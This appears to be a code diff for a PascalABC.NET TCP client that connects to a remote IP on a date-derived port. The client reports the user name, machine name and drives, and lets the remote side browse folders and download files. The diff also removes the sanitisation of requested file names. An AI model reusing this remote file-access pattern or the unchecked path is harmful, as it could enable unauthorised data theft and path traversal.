@@ -21,29 +21,31 @@ type
     public client: TcpClient;
     public stream: NetworkStream;
     public retry: byte;
-    public port: integer;
+    public port: word;
     public path, epath: string;
     public WinInfo: WindowsInformation;
-    public _pp_service: Thread;
-    
+    public _message_handler_service: Thread;
+    public tickInterval: word;
+    public lastTick: DateTime;
     
     public constructor(ip: string);
     begin
-      self.AppIsRunning := true;
       self.ip := ip; 
       self.port := 10000 + (DateTime.Now.DayOfYear mod 5000);
-      self._pp_service := new Thread(PPService);
+      self._message_handler_service := new Thread(MessageHandler);
       self.WinInfo := self.GetOSInfo();
+      self.tickInterval := 20000;
+      self.lastTick := DateTime.Now;
     end;
     
     
-    public constructor(ip: string; port: integer; clnt: TcpClient);
+    public constructor(ip: string; port: word; clnt: TcpClient);
     begin
       self.client := clnt;
       self.client.Client.ReceiveTimeout := 100;
       self.ip := ip;
       self.port := port;
-      self._pp_service := new Thread(PPService);
+      self._message_handler_service := new Thread(MessageHandler);
     end;
     
     
@@ -66,7 +68,8 @@ type
             self.client.Client.ReceiveTimeout := 100;
             self.client.SendTimeout := 4000;
             self.client.ReceiveTimeout := 4000;
-            self._pp_service.Start();
+            self.AppIsRunning := true;
+            self._message_handler_service.Start();
             cmd.CD();
             self.path := cmd.output;
             self.epath := Environment.CurrentDirectory;
@@ -83,11 +86,12 @@ type
     
     public procedure Disconnect();
     begin
+      self.AppIsRunning := false;
       if (self.client <> nil) and (self.client.Connected) then begin
         self.client.Close();
         self.client.Dispose();
         self.client := nil;
-        self._pp_service.Suspend();
+        self.KillAllServices();
       end;
     end;
     
@@ -98,7 +102,7 @@ type
       AppIsRunning := false;
       
       // Ждем завершения всех потоков
-      foreach var service in [self._pp_service] do
+      foreach var service in [self._message_handler_service] do
       begin
         if (service <> nil) and service.IsAlive then begin
           service.Join(1000); // Даем 1 секунду на завершение
@@ -110,16 +114,17 @@ type
     end;
     
     
-    private procedure PPService();
+    private procedure MessageHandler();
     begin
-      stream := self.client.GetStream();
+      self.stream := self.client.GetStream();
+      
       var data: array of byte;
-      while self.AppIsRunning do
-      begin
-        if stream.DataAvailable then begin
+      
+      while self.AppIsRunning do begin
+        
+        if self.stream.DataAvailable then begin
           SetLength(data, self.client.ReceiveBufferSize);
-          
-          var len := stream.Read(data, 0, data.Length);
+          var len := self.stream.Read(data, 0, data.Length);
           
           if len = 0 then 
             self.AppIsRunning := false; 
@@ -140,14 +145,23 @@ type
              message := ConsoleHandler(message);
           
           data := Encoding.UTF8.GetBytes(message);
-          stream.Write(data, 0, data.Length);
+          self.stream.Write(data, 0, data.Length);
           
+          self.lastTick := DateTime.Now;
         end
-      end;
+        else begin
+          var now := DateTime.Now;
+          var elapsed := (now - self.lastTick).TotalMilliseconds;
       
-      stream.Close(100);
+          if elapsed >= tickInterval then
+            self.Disconnect();
+        end;
+      end; // while
+      
+      stream.Close();
       
     end;
+    
     
     /// Обработка полученных запросов от консоли
     public function ConsoleHandler(msg: string): string;
@@ -180,8 +194,11 @@ type
             responce := JsonConvert.SerializeObject(Directory.GetFiles(self.epath));
           E_ARROW_UP:
             begin
+              Println(self.epath);
+              Println(Directory.GetDirectoryRoot(self.epath));
               if Directory.GetDirectoryRoot(self.epath) = self.epath + SLASH then exit;
               self.epath := self.epath.Substring(0, self.epath.LastIndexOf(SLASH));
+              Println(self.epath);
               
               if Directory.GetDirectoryRoot(path) = self.epath + SLASH then 
                 self.epath += SLASH;
@@ -191,7 +208,10 @@ type
           begin
             if Directory.EnumerateDirectories(self.epath, msg.Substring(3), SearchOption.TopDirectoryOnly).Count() > 0 then begin
               try 
-                var tempPath := self.epath + SLASH + msg.Substring(3);
+                var tempPath: string;
+                if self.epath.LastIndexOf(SLASH)+1 = self.epath.Length then
+                  tempPath := self.epath + msg.Substring(3) else
+                  tempPath := self.epath + SLASH + msg.Substring(3);
                 Directory.GetDirectories(tempPath);
                 self.epath := tempPath;
               except on e: Exception do 
@@ -201,10 +221,7 @@ type
           end; 
           E_RECEIVE_FILE:
             begin
-              var filePath := Strip(self.epath, AllDelimiters) + SLASH + Strip(msg.Substring(3), AllDelimiters);
-              
-              Println(filePath);
-              Println(System.IO.File.Exists(filePath));
+              var filePath := Strip(self.epath, #13+#10+' ') + SLASH + msg.Substring(3);
               var FStream: FileStream := System.IO.File.OpenRead(filePath);
               
               // Получение размера файла
@@ -226,7 +243,6 @@ type
               
               FStream.Close();
               
-              // Отправка финального подтверждения (по желанию)
               responce := E_FILE_SUCCESSFULLY_TRANSFERRED;                         
             end;    
         
@@ -249,11 +265,11 @@ type
         WinVer := obj['Caption'].ToString;
                    
       Result := new WindowsInformation(
-          WinVer.Substring(11),
-          Environment.OSVersion.Platform.ToString,
-          Environment.UserName                       as string,
-          Environment.MachineName                    as string,
-          DriveInfo.GetDrives());
+                    WinVer.Substring(11),
+                    Environment.OSVersion.Platform.ToString,
+                    Environment.UserName          as string,
+                    Environment.MachineName       as string,
+                    DriveInfo.GetDrives());
     end;
   
   end; // class
